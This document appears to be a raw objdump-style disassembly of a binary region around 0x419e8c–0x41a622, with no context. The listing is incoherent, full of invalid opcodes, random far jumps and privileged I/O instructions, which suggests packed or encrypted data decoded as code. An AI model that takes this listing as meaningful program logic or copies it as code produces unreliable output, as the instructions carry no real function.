  419e8c:	icebp  
  419e8d:	pop    esi
  419e8e:	dec    ebp
  419e8f:	outs   dx,BYTE PTR ds:[esi]
  419e90:	scas   eax,DWORD PTR es:[edi]
  419e91:	sub    DWORD PTR [edi],esp
  419e93:	js     0x419eeb
  419e95:	icebp  
  419e96:	push   esi
  419e97:	loope  0x419e5e
  419e99:	hlt    
  419e9a:	out    0x87,al
  419e9c:	(bad)  
  419e9d:	mov    DWORD PTR [esi-0x74],esp
  419ea0:	sar    DWORD PTR [edx-0x7a6efbb3],1
  419ea6:	ins    BYTE PTR es:[edi],dx
  419ea7:	ja     0x419ef0
  419ea9:	push   ebx
  419eaa:	jg     0x419ec9
  419eac:	mov    esi,0xab9c77b
  419eb1:	ss dec ebx
  419eb3:	push   ebp
  419eb4:	test   BYTE PTR [ebp+0x64],dl
  419eb7:	ins    BYTE PTR es:[edi],dx
  419eb8:	mov    ebx,0xfc5fcfb5
  419ebd:	and    BYTE PTR [edx+0x74],dh
  419ec0:	fiadd  DWORD PTR [edx]
  419ec2:	xor    al,BYTE PTR [eax]
  419ec4:	mov    cl,0x32
  419ec6:	aaa    
  419ec7:	call   0xd6f68b54
  419ecc:	sti    
  419ecd:	outs   dx,DWORD PTR ds:[esi]
  419ece:	mov    eax,0xcc073ba8
  419ed3:	nop
  419ed4:	xchg   ebx,eax
  419ed5:	jb     0x419f1f
  419ed7:	repz in al,0xf6
  419eda:	dec    eax
  419edb:	fld    DWORD PTR [ebp+0x54ba1b47]
  419ee1:	xchg   edx,eax
  419ee2:	js     0x419f31
  419ee4:	imul   esi,DWORD PTR [ebx+0x3683f416],0xb9f18878
  419eee:	xchg   edx,eax
  419eef:	push   esp
  419ef0:	push   edi
  419ef1:	jmp    0x4157:0x83d11d7d
  419ef8:	ja     0x419ea6
  419efa:	xor    eax,0xa758a7f2
  419eff:	scas   eax,DWORD PTR es:[edi]
  419f00:	outs   dx,BYTE PTR ds:[esi]
  419f01:	add    DWORD PTR [ebx+eiz*1],esp
  419f04:	leave  
  419f05:	test   bh,dl
  419f07:	test   ecx,edx
  419f09:	jmp    0x419f53
  419f0b:	loopne 0x419ed4
  419f0d:	add    al,0x3e
  419f0f:	inc    ecx
  419f10:	mov    ecx,0x741d66a
  419f15:	clc    
  419f16:	jnp    0x419f2b
  419f18:	stos   BYTE PTR es:[edi],al
  419f19:	clc    
  419f1a:	hlt    
  419f1b:	ret    0x1c2f
  419f1e:	pop    ss
  419f1f:	loope  0x419ebd
  419f21:	retf   
  419f22:	xchg   ebx,eax
  419f23:	ror    dl,0x65
  419f26:	xor    al,0x22
  419f28:	shl    esp,0xda
  419f2b:	jmp    0x73a:0xa41710be
  419f32:	jo     0x419f68
  419f34:	or     DWORD PTR [ecx-0x50],edi
  419f37:	shr    DWORD PTR ds:0x4e619cb0,cl
  419f3d:	dec    dl
  419f3f:	pop    edx
  419f40:	(bad)  
  419f41:	pop    ds
  419f42:	push   edx
  419f43:	kandnb k6,k4,k0
  419f47:	lds    esi,FWORD PTR ds:0xe2e087d5
  419f4d:	loopne 0x419f14
  419f4f:	and    eax,0xc2f0a2f1
  419f54:	test   BYTE PTR ds:0x2dd882c3,al
  419f5a:	sbb    eax,0x4df9baaf
  419f5f:	int    0x1c
  419f61:	js     0x419f2c
  419f63:	inc    edi
  419f64:	out    dx,al
  419f65:	ret    
  419f66:	dec    edi
  419f67:	nop
  419f68:	jge    0x419f80
  419f6a:	in     eax,0x21
  419f6c:	sbb    BYTE PTR [edi+0x26],ah
  419f6f:	fstp   st(4)
  419f71:	test   BYTE PTR [ebx-0x3],al
  419f74:	aam    0x53
  419f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f77:	out    dx,al
  419f78:	lahf   
  419f79:	sbb    al,0xc5
  419f7b:	add    esp,ebx
  419f7d:	push   edi
  419f7e:	adc    al,0x1e
  419f80:	sub    DWORD PTR [bp+di],0x22d74c63
  419f87:	mov    ds:0xb9dcf02f,eax
  419f8c:	cmc    
  419f8d:	outs   dx,BYTE PTR ds:[esi]
  419f8e:	xor    al,0x8d
  419f91:	dec    esp
  419f92:	mov    ebx,DWORD PTR [edx+0x1e]
  419f95:	jecxz  0x419f30
  419f97:	jae    0x419f6f
  419f99:	inc    esp
  419f9a:	addr16 out 0x91,al
  419f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f9e:	and    DWORD PTR [ebx],0xfd091106
  419fa4:	xor    ecx,DWORD PTR [ebp+0x5b36966b]
  419faa:	cmp    eax,0x6103f36e
  419faf:	pop    edi
  419fb0:	inc    esi
  419fb1:	clc    
  419fb2:	push   esp
  419fb3:	dec    edi
  419fb4:	(bad)  
  419fb5:	(bad)  
  419fb7:	adc    BYTE PTR [eax+0x4b620cf2],0x4e
  419fbe:	data16 adc al,0x5
  419fc1:	mov    esi,0xe4c9d590
  419fc6:	dec    ecx
  419fc7:	std    
  419fc8:	or     DWORD PTR [edx],edx
  419fca:	xchg   ecx,eax
  419fcb:	mov    DWORD PTR [edx-0x2cd0614c],edi
  419fd1:	and    al,0xd7
  419fd3:	or     BYTE PTR [esi-0x2f],bl
  419fd6:	pop    es
  419fd7:	sbb    bl,ch
  419fd9:	adc    ecx,DWORD PTR [esi-0x16992e5e]
  419fdf:	and    BYTE PTR [esi-0x79],0xc2
  419fe3:	push   ebp
  419fe4:	daa    
  419fe5:	popa   
  419fe6:	xchg   esp,eax
  419fe7:	mov    dl,BYTE PTR [ebx+0x24]
  419fea:	in     al,dx
  419feb:	cli    
  419fec:	add    esi,DWORD PTR [esi+0x6537f665]
  419ff2:	rcl    BYTE PTR [edx+edx*4-0x137b25af],cl
  419ff9:	jns    0x419ffb
  419ffb:	dec    eax
  419ffc:	adc    BYTE PTR [edi+0x3e606959],0xaf
  41a003:	fisttp QWORD PTR [ebx-0x2b]
  41a006:	adc    bh,ch
  41a008:	push   ss
  41a009:	(bad)  
  41a00b:	(bad)  
  41a00c:	popf   
  41a00d:	mov    eax,ds:0xa737d68f
  41a012:	jbe    0x41a060
  41a014:	lods   eax,DWORD PTR ds:[esi]
  41a015:	mov    al,ds:0x2feb0ba3
  41a01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a01b:	jl     0x41a071
  41a01d:	xchg   edi,eax
  41a01e:	and    edx,DWORD PTR [edx-0x234abb36]
  41a024:	lahf   
  41a025:	push   edx
  41a026:	loope  0x41a099
  41a028:	add    eax,edx
  41a02a:	mov    dh,0xfe
  41a02c:	sbb    ebp,DWORD PTR ds:0xc1f29c6a
  41a032:	fs dec esi
  41a034:	je     0x41a0a5
  41a036:	in     eax,0x3a
  41a038:	pop    ds
  41a039:	call   0xa0c9:0x55da8d4c
  41a040:	sub    ah,BYTE PTR [ebp-0x60b2ce2b]
  41a046:	adc    eax,DWORD PTR [edx-0x57cb6a5d]
  41a04c:	mov    eax,ds:0x3cd77c65
  41a051:	in     al,0xee
  41a053:	pop    eax
  41a054:	popa   
  41a055:	sbb    al,0x40
  41a057:	test   eax,0x11518572
  41a05c:	mov    eax,0xa4c38d82
  41a061:	cmp    BYTE PTR [edx+ebx*8],dh
  41a064:	lock lds ebx,FWORD PTR [ebx+ecx*1+0x409dcee]
  41a06c:	or     eax,ebp
  41a06e:	pop    ebp
  41a06f:	sbb    eax,0xdc62e3a
  41a074:	add    al,0xb0
  41a076:	fiadd  WORD PTR cs:[ebx-0x596fa285]
  41a07d:	push   ebx
  41a07e:	dec    ax
  41a080:	add    DWORD PTR [edx],ecx
  41a082:	fxch   st(1)
  41a084:	loopne 0x41a06a
  41a086:	lds    ebp,FWORD PTR [ebp-0x641657f0]
  41a08c:	call   0xddd61be0
  41a091:	sub    al,0x8b
  41a093:	(bad)  
  41a095:	pop    ebx
  41a096:	pop    ebp
  41a097:	adc    dl,BYTE PTR [ebp-0x41]
  41a09a:	adc    DWORD PTR [ecx],0x18d75abd
  41a0a0:	adc    eax,0xc27c3f7
  41a0a5:	mov    ebx,DWORD PTR [ebx]
  41a0a7:	hlt    
  41a0a8:	push   0x7ae249e0
  41a0ad:	in     al,0x13
  41a0af:	int3   
  41a0b0:	call   DWORD PTR [ecx+0x39]
  41a0b3:	xor    bh,bh
  41a0b5:	pop    eax
  41a0b6:	shl    DWORD PTR [edx+0x36],cl
  41a0b9:	add    DWORD PTR [esi+eiz*4-0x47],0xdf993255
  41a0c1:	xor    al,0x25
  41a0c3:	jbe    0x41a126
  41a0c5:	stc    
  41a0c6:	cwde   
  41a0c7:	adc    al,0xba
  41a0c9:	les    edi,FWORD PTR [edx+edi*2+0x64e750c8]
  41a0d0:	dec    ebx
  41a0d1:	inc    edi
  41a0d2:	inc    eax
  41a0d3:	jmp    0xd4d00321
  41a0d8:	and    esp,edx
  41a0da:	cmp    eax,0xe40ae13f
  41a0df:	mov    dh,0x15
  41a0e1:	add    eax,esi
  41a0e3:	popa   
  41a0e4:	sahf   
  41a0e5:	ret    
  41a0e6:	mov    dh,BYTE PTR [ebx+0x2f6faffc]
  41a0ec:	leave  
  41a0ed:	jmp    0xa1329ac0
  41a0f2:	mov    ds,WORD PTR [esi+eiz*1]
  41a0f5:	test   eax,0x2052e908
  41a0fa:	loopne 0x41a169
  41a0fc:	push   0xffffff8b
  41a0fe:	jno    0x41a120
  41a100:	int    0xb
  41a102:	mov    eax,0xd2d4d777
  41a107:	adc    dl,cl
  41a109:	mov    cl,0x6a
  41a10b:	sub    eax,0x7b434cea
  41a110:	mov    cl,0xf0
  41a112:	fdiv   QWORD PTR [edx+0x58a4fd0d]
  41a118:	ins    BYTE PTR es:[edi],dx
  41a119:	rol    BYTE PTR [eax],0x66
  41a11c:	sub    DWORD PTR [ebx],esi
  41a11e:	nop
  41a11f:	mov    bh,0x2
  41a121:	mov    eax,0x2d205443
  41a126:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a128:	sub    DWORD PTR [edi],esp
  41a12a:	mov    edx,0xc2f299ec
  41a12f:	and    ebp,DWORD PTR [ebx+0x4b]
  41a132:	mov    edi,0xf2250d58
  41a137:	and    eax,0xd41fa4e1
  41a13c:	int    0xe9
  41a13e:	bound  esi,QWORD PTR [ecx]
  41a140:	scas   eax,DWORD PTR es:[edi]
  41a141:	mov    esp,0x5d439be6
  41a146:	in     al,dx
  41a147:	js     0x41a1bf
  41a149:	lods   eax,DWORD PTR ds:[esi]
  41a14a:	mov    cl,0xc7
  41a14c:	repz into 
  41a14e:	push   ebx
  41a14f:	mov    bh,0x9d
  41a151:	mov    bl,BYTE PTR [esp+esi*2+0x76]
  41a155:	cs sbb cl,0x35
  41a159:	dec    eax
  41a15a:	jge    0x41a12d
  41a15c:	jae    0x41a132
  41a15e:	out    dx,al
  41a15f:	xchg   ebx,eax
  41a160:	xor    DWORD PTR [esi+ecx*8-0x5e],0x45
  41a165:	ds loop 0x41a126
  41a168:	cdq    
  41a169:	fcomip st,st(4)
  41a16b:	jg     0x41a1c1
  41a16d:	xor    bl,BYTE PTR [edx]
  41a16f:	stc    
  41a170:	xchg   ebx,eax
  41a171:	not    BYTE PTR ds:0xd632542c
  41a177:	mov    eax,0xa19ff620
  41a17c:	int3   
  41a17d:	push   0xffffffe1
  41a17f:	mov    ah,0xb3
  41a181:	int    0xcb
  41a183:	or     eax,0xb07a9f39
  41a188:	cmp    ecx,DWORD PTR [ebp+edx*8-0x4d]
  41a18c:	add    ecx,DWORD PTR [eax+0x6d3a27cc]
  41a192:	mov    WORD PTR [ebx+edi*4],fs
  41a195:	push   esi
  41a196:	push   esi
  41a197:	in     al,dx
  41a198:	pop    ecx
  41a199:	test   eax,0x37b16810
  41a19e:	xor    bh,BYTE PTR [edi+edx*2]
  41a1a1:	push   0xffffff91
  41a1a3:	call   0x9e33:0x7aa24728
  41a1aa:	clc    
  41a1ab:	not    DWORD PTR [eax-0xe]
  41a1ae:	push   edi
  41a1af:	cmp    al,0x23
  41a1b1:	or     dl,BYTE PTR [ecx-0x48d6676e]
  41a1b7:	lock test al,0x3a
  41a1ba:	in     eax,0x1a
  41a1bc:	mov    eax,0x24b7de9c
  41a1c1:	inc    ecx
  41a1c2:	jp     0x41a19f
  41a1c4:	jmp    0xfc46:0x8063b1ae
  41a1cb:	push   ds
  41a1cc:	stc    
  41a1cd:	fild   QWORD PTR [eax+0x16303480]
  41a1d3:	cmp    eax,DWORD PTR [ebp-0x7158834e]
  41a1d9:	lahf   
  41a1da:	pop    es
  41a1db:	idiv   ch
  41a1dd:	loope  0x41a1ce
  41a1df:	cs (bad) 
  41a1e1:	xor    ebp,DWORD PTR ds:0x83ba20d9
  41a1e7:	std    
  41a1e8:	pop    edi
  41a1e9:	jne    0x41a1fd
  41a1eb:	add    dh,BYTE PTR [ecx]
  41a1ed:	out    dx,al
  41a1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1ef:	pop    esp
  41a1f0:	push   ebp
  41a1f1:	sahf   
  41a1f2:	sti    
  41a1f3:	sub    bl,BYTE PTR [eax+0x18f1bf89]
  41a1f9:	sub    ch,BYTE PTR [ecx]
  41a1fb:	lahf   
  41a1fc:	test   eax,0x5d522257
  41a201:	sub    dh,dh
  41a203:	mov    ah,0xe6
  41a205:	jg     0x41a1ed
  41a207:	data16 or BYTE PTR [ebx+ebp*1],0x12
  41a20c:	(bad)  
  41a20d:	push   esp
  41a20f:	cwde   
  41a210:	rcl    BYTE PTR [eax-0x70],cl
  41a213:	outs   dx,BYTE PTR ds:[esi]
  41a214:	or     eax,0x59c8f67d
  41a219:	js     0x41a24d
  41a21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a21c:	or     DWORD PTR [eax],ebx
  41a21e:	inc    ebx
  41a21f:	lock pop ebx
  41a221:	dec    ebp
  41a222:	add    eax,DWORD PTR [esi+0x78]
  41a225:	(bad)  
  41a226:	daa    
  41a227:	mov    BYTE PTR [ecx-0x4033921c],bh
  41a22d:	cmp    al,cl
  41a22f:	popf   
  41a230:	mov    ecx,0x5e62e403
	...
  41a241:	scas   al,BYTE PTR es:[edi]
  41a242:	add    ebx,ebp
  41a244:	mov    ds:0xdeeebef,eax
  41a249:	mov    ebp,DWORD PTR [edi]
  41a24b:	ins    BYTE PTR es:[edi],dx
  41a24c:	adc    edi,eax
  41a24e:	adc    al,0x7d
  41a250:	test   eax,0x12011
  41a255:	lods   al,BYTE PTR ds:[esi]
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    BYTE PTR [ecx],bl
  41a25a:	test   al,0x9d
  41a25c:	out    0x1b,al
  41a25e:	stos   DWORD PTR es:[edi],eax
  41a25f:	into   
  41a260:	outs   dx,BYTE PTR ds:[esi]
  41a261:	mov    ?,esp
  41a263:	or     al,0x11
  41a265:	inc    ebp
  41a266:	add    bl,BYTE PTR ds:0x8b128bbb
  41a26c:	jb     0x41a21b
  41a26e:	sub    edx,DWORD PTR [esi+0x37d2a641]
  41a274:	add    al,0x58
  41a276:	iret   
  41a277:	lods   al,BYTE PTR ds:[esi]
  41a278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a279:	outs   dx,BYTE PTR ds:[esi]
  41a27a:	mov    ah,0xe9
  41a27c:	shl    DWORD PTR [esi+ecx*8-0x69],cl
  41a280:	out    dx,eax
  41a281:	mov    edi,0xfbaf22b3
  41a286:	imul   edx,ecx,0x10
  41a289:	ss or  al,0xa
  41a28c:	jp     0x41a23b
  41a28e:	retf   
  41a28f:	call   DWORD PTR [ebx-0x542ef780]
  41a295:	jmp    DWORD PTR [edx+0x16235f9d]
  41a29b:	push   edx
  41a29c:	and    esi,DWORD PTR [edi]
  41a29e:	fmul   DWORD PTR [edi]
  41a2a0:	ja     0x41a29f
  41a2a2:	popf   
  41a2a3:	and    al,0xeb
  41a2a5:	xchg   DWORD PTR [ebx-0x4a],eax
  41a2a8:	dec    ecx
  41a2a9:	sub    al,0xef
  41a2ab:	add    DWORD PTR [ecx],esp
  41a2ad:	ja     0x41a294
  41a2af:	mov    dl,0x47
  41a2b1:	mov    ?,WORD PTR ds:0x527da9ef
  41a2b7:	sbb    al,0x37
  41a2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ba:	scas   al,BYTE PTR es:[edi]
  41a2bb:	in     eax,0xee
  41a2bd:	call   0x9cb4:0x998180a3
  41a2c4:	aam    0x2c
  41a2c6:	pushf  
  41a2c7:	loope  0x41a2fd
  41a2c9:	push   esp
  41a2ca:	pop    ss
  41a2cb:	loop   0x41a323
  41a2cd:	fldcw  WORD PTR [ebx+0x7c457d74]
  41a2d3:	jge    0x41a274
  41a2d5:	mov    bl,0x82
  41a2d7:	ins    DWORD PTR es:[edi],dx
  41a2d8:	push   edx
  41a2d9:	clc    
  41a2da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2db:	rcr    BYTE PTR ds:0x6cd6138b,1
  41a2e1:	ja     0x41a27d
  41a2e3:	inc    ebx
  41a2e4:	fst    st(4)
  41a2e6:	sub    edi,DWORD PTR [edx-0x30c3a091]
  41a2ec:	into   
  41a2ed:	push   cs
  41a2ee:	pop    esi
  41a2ef:	xchg   edx,eax
  41a2f0:	mov    bh,0x82
  41a2f2:	ins    BYTE PTR es:[edi],dx
  41a2f3:	dec    eax
  41a2f4:	aas    
  41a2f5:	inc    esi
  41a2f7:	std    
  41a2f8:	cli    
  41a2f9:	push   esi
  41a2fa:	jae    0x41a2e3
  41a2fc:	xchg   edi,eax
  41a2fd:	push   0x22a3cf16
  41a302:	inc    edx
  41a303:	clc    
  41a304:	sub    DWORD PTR ds:0x77d7278b,ebp
  41a30a:	rcr    BYTE PTR [eax+ecx*1+0x57f9671d],cl
  41a311:	stos   DWORD PTR es:[edi],eax
  41a312:	ss ins DWORD PTR es:[edi],dx
  41a314:	sub    BYTE PTR [edx-0xe1c03fd],dh
  41a31a:	mov    cl,0x63
  41a31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a31d:	aad    0xb8
  41a31f:	pop    ebx
  41a320:	cmp    al,0xa7
  41a322:	ret    0x3143
  41a325:	dec    ebp
  41a326:	mov    ebp,ebp
  41a328:	(bad)  
  41a329:	push   edx
  41a32a:	fisubr WORD PTR [ecx+0x7cc541d0]
  41a330:	cs in  eax,dx
  41a332:	ret    
  41a333:	inc    edx
  41a334:	retf   0xc168
  41a337:	xchg   edx,eax
  41a338:	dec    ebp
  41a339:	mov    WORD PTR [ebx+0x2d],cs
  41a33c:	dec    ecx
  41a33d:	call   0xd63d7a4b
  41a342:	test   eax,0xf54daf4
  41a347:	push   esp
  41a348:	mov    eax,0x3f4328df
  41a34d:	outs   dx,DWORD PTR ds:[esi]
  41a34e:	out    0xc0,eax
  41a350:	stos   BYTE PTR es:[edi],al
  41a351:	xor    eax,0x9ed8b4ed
  41a356:	mov    ecx,0xc6befbf8
  41a35b:	dec    edx
  41a35c:	sbb    ebp,esi
  41a35e:	mov    esi,0x9a55e00c
  41a363:	push   ss
  41a364:	mov    ?,WORD PTR [esi]
  41a366:	loopne 0x41a2e8
  41a368:	jp     0x41a301
  41a36a:	inc    ebx
  41a36b:	stos   BYTE PTR es:[edi],al
  41a36c:	pop    ebp
  41a36d:	xlat   BYTE PTR ds:[ebx]
  41a36e:	fistp  QWORD PTR [ebp+0x5b]
  41a371:	aaa    
  41a372:	sub    bh,cl
  41a374:	ret    0xf6a2
  41a377:	imul   edi,DWORD PTR [eax],0x6d
  41a37a:	(bad)
  41a37d:	add    al,0xeb
  41a37f:	cmp    dh,BYTE PTR [eax-0x6f]
  41a382:	inc    edi
  41a383:	loop   0x41a3d8
  41a385:	pop    edi
  41a386:	in     eax,dx
  41a387:	adc    ebx,ebx
  41a389:	push   ecx
  41a38a:	push   ebx
  41a38b:	mov    esp,0x583eff78
  41a390:	add    cl,BYTE PTR [esi-0x11aba000]
  41a396:	inc    eax
  41a397:	ret    
  41a398:	ror    bh,0x11
  41a39b:	mov    WORD PTR [ecx-0x36],ss
  41a39e:	jno    0x41a3a0
  41a3a0:	icebp  
  41a3a1:	pop    ds
  41a3a2:	adc    ebp,ebp
  41a3a4:	jmp    0xc52eaf01
  41a3a9:	adc    al,BYTE PTR [ebp+ebx*4+0x64]
  41a3ad:	sub    al,0xcc
  41a3af:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41a3b1:	push   ds
  41a3b2:	test   al,0x28
  41a3b4:	sbb    BYTE PTR [ebp+0x5c3a7f63],0xe9
  41a3bb:	mov    DWORD PTR [eax+ebp*2-0x1],eax
  41a3bf:	xor    esi,DWORD PTR [esp+edi*8-0x419e967d]
  41a3c6:	inc    ebx
  41a3c7:	or     esi,DWORD PTR [eax]
  41a3c9:	bound  ebp,QWORD PTR [edi-0x5afb8748]
  41a3cf:	aam    0x6b
  41a3d1:	push   0x37d77ca
  41a3d6:	vpshufhw ymm1,YMMWORD PTR [esi],0x1d
  41a3db:	sbb    DWORD PTR [ebx+0x42],edi
  41a3de:	dec    DWORD PTR [eax]
  41a3e0:	repnz mov ah,0xab
  41a3e3:	hlt    
  41a3e4:	addr16 push cs
  41a3e6:	lahf   
  41a3e7:	out    dx,eax
  41a3e8:	repz mov bh,0x90
  41a3eb:	ror    DWORD PTR [esi],1
  41a3ed:	push   0xffffffca
  41a3ef:	(bad)  
  41a3f0:	out    0x7f,al
  41a3f2:	mov    edi,0x2763b93
  41a3f7:	mov    ds:0x304b995b,eax
  41a3fc:	scas   eax,DWORD PTR es:[edi]
  41a3fd:	xor    BYTE PTR [esi+0x464dee8c],al
  41a403:	mov    edx,0x72c3d166
  41a408:	push   ebp
  41a409:	in     eax,dx
  41a40a:	sbb    DWORD PTR ds:0x87dd4608,ebp
  41a410:	and    ah,BYTE PTR ds:0xe4f0e7e6
  41a416:	sbb    BYTE PTR [edi*8+0x164c5f0e],dl
  41a41d:	mov    ds:0x3fe7fe6d,al
  41a422:	cld    
  41a423:	fadd   st,st(2)
  41a425:	repnz xor dl,BYTE PTR [eax+0x6e]
  41a429:	xchg   BYTE PTR [ecx],al
  41a42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42c:	sub    BYTE PTR [eax+0x31],ch
  41a42f:	sbb    ebp,edx
  41a431:	pop    edi
  41a432:	int3   
  41a433:	jno    0x41a490
  41a435:	stos   BYTE PTR es:[edi],al
  41a436:	add    al,0x14
  41a438:	add    esp,esp
  41a43a:	outs   dx,DWORD PTR ds:[esi]
  41a43b:	jecxz  0x41a44e
  41a43d:	retf   
  41a43e:	cmp    BYTE PTR [ebx+0x38ad3886],dl
  41a444:	mov    ebp,0xc43066a5
  41a449:	mov    ds:0xfc44869d,al
  41a44e:	sbb    BYTE PTR [edx+0x3b],dl
  41a451:	fsub   QWORD PTR [edi]
  41a453:	stos   DWORD PTR es:[edi],eax
  41a454:	jge    0x41a3fc
  41a456:	imul   edi,DWORD PTR [edi],0xd8b8bcb7
  41a45c:	and    cl,dh
  41a45e:	fcomp  QWORD PTR [ebp-0x2e]
  41a461:	pop    edi
  41a462:	clc    
  41a463:	js     0x41a44e
  41a465:	aaa    
  41a466:	push   ecx
  41a467:	jmp    0x4daaaae7
  41a46c:	mov    dl,0x84
  41a46e:	pop    esp
  41a46f:	scas   al,BYTE PTR es:[edi]
  41a470:	or     ebp,ecx
  41a472:	ins    DWORD PTR es:[edi],dx
  41a473:	les    esp,FWORD PTR [edi+eax*2-0x41]
  41a477:	loop   0x41a41b
  41a479:	or     dh,BYTE PTR [edi]
  41a47b:	xor    eax,0xcdc716ab
  41a480:	imul   ebx,DWORD PTR [edi],0x5
  41a483:	in     eax,0x64
  41a485:	pop    es
  41a486:	push   esi
  41a487:	mov    al,ds:0x97cbdb94
  41a48c:	mov    dh,al
  41a48e:	stc    
  41a48f:	stc    
  41a490:	and    BYTE PTR [eax+0x5a01af00],bl
  41a496:	push   ebp
  41a497:	jbe    0x41a4a2
  41a499:	xlat   BYTE PTR ds:[ebx]
  41a49a:	das    
  41a49b:	mov    ebp,0x4affd758
  41a4a0:	mov    edi,DWORD PTR [ecx+0x710929e4]
  41a4a6:	jbe    0x41a51b
  41a4a8:	(bad)  
  41a4a9:	shl    ch,1
  41a4ab:	pop    edx
  41a4ac:	cmp    eax,0x914bf3eb
  41a4b1:	stc    
  41a4b2:	mov    cl,0xb0
  41a4b4:	int    0x4d
  41a4b6:	aas    
  41a4b7:	ret    0x1bcf
  41a4ba:	xor    BYTE PTR [ebp+0x65ba8f66],al
  41a4c0:	dec    ebx
  41a4c1:	outs   dx,DWORD PTR ds:[esi]
  41a4c2:	mov    ah,0xda
  41a4c4:	xchg   DWORD PTR ss:[edx],edx
  41a4c7:	mov    ds:0x23474332,al
  41a4cc:	pop    ss
  41a4cd:	mov    esp,0x5593b7e4
  41a4d2:	add    DWORD PTR [edx],ebx
  41a4d4:	xor    DWORD PTR [esi+esi*8-0x42e93e5b],0x29
  41a4dc:	cmc    
  41a4dd:	push   ss
  41a4de:	push   edx
  41a4df:	div    DWORD PTR [esi]
  41a4e1:	(bad)  
  41a4e2:	aas    
  41a4e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4e4:	dec    esp
  41a4e5:	cmp    cl,BYTE PTR [esi+edi*1+0x604e2a9e]
  41a4ec:	and    BYTE PTR [ecx-0x29],al
  41a4ef:	and    DWORD PTR es:[ebx],edx
  41a4f2:	and    ebp,DWORD PTR [ebx+edi*8+0x5b452cf5]
  41a4f9:	(bad)  
  41a4fa:	iret   
  41a4fb:	mov    edi,0x383fbe3a
  41a500:	mov    DWORD PTR [edx+eax*2+0x741feea5],esp
  41a507:	fdiv   st(6),st
  41a509:	jle    0x41a51d
  41a50b:	adc    DWORD PTR [ecx+0x42],edx
  41a50e:	(bad)  
  41a50f:	test   eax,0x6c936399
  41a514:	adc    BYTE PTR [edx-0x71],bh
  41a517:	in     al,0x4c
  41a519:	mov    ch,0xe1
  41a51b:	out    0xa7,eax
  41a51d:	jp     0x41a529
  41a51f:	fild   DWORD PTR ds:0xfceaa5f9
  41a525:	pop    edi
  41a526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a527:	dec    esi
  41a528:	outs   dx,DWORD PTR ds:[esi]
  41a529:	hlt    
  41a52a:	mov    eax,ds:0xf2e27cde
  41a52f:	jno    0x41a576
  41a531:	fistp  QWORD PTR [esi]
  41a533:	fstp   QWORD PTR [esi-0x5de8c52a]
  41a539:	adc    al,0x82
  41a53b:	lock sub ebp,DWORD PTR [edi+0x27]
  41a53f:	lods   eax,DWORD PTR ds:[esi]
  41a540:	mov    dh,0xe2
  41a542:	ins    DWORD PTR es:[edi],dx
  41a543:	adc    eax,0x1ceb8c74
  41a548:	dec    ebp
  41a549:	add    BYTE PTR [eax-0x3d169218],ah
  41a54f:	loope  0x41a4e3
  41a551:	inc    eax
  41a552:	out    0x39,al
  41a554:	stos   DWORD PTR es:[edi],eax
  41a555:	in     eax,dx
  41a556:	mov    eax,0x335e9e6e
  41a55b:	cmp    dh,ch
  41a55d:	into   
  41a55e:	call   0x86fa:0x3da828b2
  41a565:	xor    DWORD PTR [esi],edx
  41a567:	jbe    0x41a5d1
  41a569:	add    BYTE PTR [eax+0x1a8d8461],0xe8
  41a570:	or     al,0xbc
  41a572:	into   
  41a573:	imul   edi,DWORD PTR [ecx-0x1e],0xfffffff2
  41a577:	test   BYTE PTR [ebx-0x796cc28b],0xd6
  41a57e:	and    BYTE PTR [ecx+edx*8+0x34dec8cd],al
  41a585:	xchg   ebp,eax
  41a586:	inc    edx
  41a587:	hlt    
  41a588:	call   0x3acc9033
  41a58d:	or     DWORD PTR [ebp-0x7f],ebx
  41a590:	pop    ecx
  41a591:	add    al,0x18
  41a593:	(bad)  
  41a594:	mov    bh,0x2b
  41a596:	sub    ch,al
  41a598:	imul   edx,DWORD PTR [ebx-0x1d],0x4f40768
  41a59f:	mov    ah,0x40
  41a5a1:	add    DWORD PTR [esi-0x42277fb7],esp
  41a5a7:	sub    BYTE PTR [ebx-0x78],al
  41a5aa:	(bad)  
  41a5ab:	adc    edx,esp
  41a5ad:	mov    ebp,edx
  41a5af:	mov    es,WORD PTR [ebx]
  41a5b1:	jae    0x41a543
  41a5b3:	sbb    BYTE PTR [edi],al
  41a5b5:	add    BYTE PTR [esi+eax*8+0x7a],bh
  41a5b9:	pop    bp
  41a5bb:	repz bound esi,QWORD PTR [ebp+esi*1+0x2e]
  41a5c0:	jae    0x41a583
  41a5c2:	jb     0x41a5d2
  41a5c4:	push   ebx
  41a5c5:	dec    ecx
  41a5c6:	ret    0xcef6
  41a5c9:	mov    edi,0x39102537
  41a5ce:	xor    dl,ch
  41a5d0:	mov    ds:0x36947acb,eax
  41a5d5:	lock cmp ch,BYTE PTR [ebx-0x4e]
  41a5d9:	mov    bh,0xa6
  41a5db:	sbb    ecx,edx
  41a5dd:	lea    eax,[edi-0x26546df2]
  41a5e3:	out    dx,eax
  41a5e4:	pop    ebx
  41a5e5:	in     al,dx
  41a5e6:	jp     0x41a569
  41a5e8:	lds    eax,FWORD PTR [ecx-0x1c]
  41a5eb:	in     al,dx
  41a5ec:	and    edx,DWORD PTR [ebx]
  41a5ee:	sub    eax,0x56cbb188
  41a5f3:	sbb    BYTE PTR [edi-0x5f],bh
  41a5f6:	xor    eax,0xc19aae6d
  41a5fb:	ins    BYTE PTR es:[edi],dx
  41a5fc:	or     bh,BYTE PTR ds:0x10cd6ab
  41a602:	xchg   DWORD PTR [eax+0x70],ebx
	...
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xbd1d:0xe251994e
  41a622:	and    eax,DWORD PTR [ecx]
